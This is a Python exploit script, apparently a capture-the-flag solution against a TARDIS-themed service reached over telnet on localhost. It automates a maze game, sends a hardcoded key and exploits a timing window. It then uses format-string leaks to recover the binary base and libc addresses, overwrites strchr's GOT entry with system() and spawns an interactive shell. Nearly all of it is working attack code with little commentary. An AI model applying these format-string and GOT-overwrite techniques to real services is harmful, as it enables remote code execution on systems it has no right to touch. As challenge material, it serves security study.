#! /usr/bin/env python3

from telnetlib import Telnet
from math import sqrt
import datetime
import time
import struct
from libformatstr3 import FormatStr



HOST = 'localhost'
PORT = 2606


def distance(nw, ny, tgtx, tgty):
    return sqrt((tgtx-nw)**2 +  (tgtx-ny)**2)
    

def game(tn):

    field = []
    goal = False
        
    while not goal:

        nxt = ''
        dist = 99999999999999.0

        buf=tn.read_until(b'   012345678901234567890\n')
        for i in range(0, 20):
            ln = tn.read_until(b'\n')[3:-1].decode()
            for j in range(0, len(ln)):
                if ln[j] in ['V', '^',  '<', '>']:
                     nx = j
                     ny = i
                
                elif ln[j] in ['E', 'T']:
                    tgtx = j
                    tgty = i
            field.append(ln)
            

        if tgtx > nx and field[nx+1][ny] != 'A':
            dist = distance(nx+1, ny, tgtx, tgty)
            nxt = 'd'
            if nx+1 == tgtx and ny == tgty:
                goal = True
                
        elif tgtx < nx and field[nx-1][ny] != 'A':
            tmp = distance(nx-1, ny, tgtx, tgty)
            if dist > tmp or nxt == '':
                dist = tmp
                nxt = 'a'
                if nx-1 == tgtx and ny == tgty:
                    goal = True
                
        if tgty > ny and field[nx][ny+1] != 'A':
            tmp = distance(nx, ny+1, tgtx, tgty)
            if dist > tmp or nxt == '':
                dist = tmp
                nxt = 's'
                if nx == tgtx and ny+1 == tgty:
                    goal = True
                    
        elif tgty < ny and field[nx][ny-1] != 'A':
            tmp = distance(nx, ny-1, tgtx, tgty)
            if dist > tmp or nxt == '':
                dist = tmp
                nxt = 'w'
                if nx == tgtx and ny-1 == tgty:
                    goal = True

        if nxt == '':
            raise ''
        tn.read_until(b'Your move (w,a,s,d,q): ')
        tn.write(nxt.encode() + b'\n')

        
def main():

    coordinates =  '51.492137,-0.192878 '
    libc_setsockopt_offset = 0xea8e0
    libc_system_offset = 0x3af40
    libc_binsh_offset = 0x15ef08
    strchr_got_offset = 0x505c
    
    tn  = Telnet(HOST, PORT)
    stage = 0
    while stage < 5:
        try:
            game(tn)
            stage += 1
        except:
            del(tn)
            tn  = Telnet(HOST, PORT)
            stage = 0

    
    tn.read_until(b'TARDIS KEY: ')
    tn.write(b'UeSlhCAGEp\n')
    tn.read_until(b'Selection: ')
    tn.write(b'11111111\x00')

    print('wait for alarm')
    time.sleep(3)

    tn.write(struct.pack('L', 1431907181))
    tn.write(b'11111111\xff')
    tn.write(b'1\n')
    
    
    tn.read_until(b'Selection: ')
    tn.write(b'3\n')
    
    tn.read_until(b'Coordinates: ')
    tn.write(coordinates.encode())
    tn.write('zzz%{}$p\n'.format(int((0xff8ce05c-0xff8cdc0c)/4-1)).encode())
    tn.read_until(b'zzz')
    
    base_addr = int(tn.read_some()[0:10].decode(), 16) - 0x1491
    print('base addr : {}'.format(hex(base_addr)))
    
    tn.read_until(b'Coordinates: ')

    tn.write(coordinates.encode())
    tn.write(b'zzzz')
    tn.write(struct.pack('<I', base_addr+0x500c)) 
    tn.write(b'%21$s\n')
    tn.read_until(b'zzzz')
    setsockopt_addr = struct.unpack('<I', tn.read_some()[4:8])[0]
    print('setsockopt :{}'.format(hex(setsockopt_addr)))

    libc_system = setsockopt_addr - (libc_setsockopt_offset - libc_system_offset)
    libc_binsh = setsockopt_addr - (libc_setsockopt_offset - libc_binsh_offset)

    print('system :{}'.format(hex(libc_system)))

    strchr_got = base_addr + strchr_got_offset

    print('strchr_got :{}'.format(hex(strchr_got)))

    p = FormatStr()
    p[strchr_got] = libc_system - 0x14 - 0x140000

    tn.write(coordinates.encode())
    tn.write(p.payload(20) + b'\n')

    tn.read_until(b'Coordinates: ')
    tn.read_until(b'Coordinates: ')
    tn.write(b'/bin/sh\n')
    tn.interact()
    
    
if __name__ == '__main__':
    main()
    
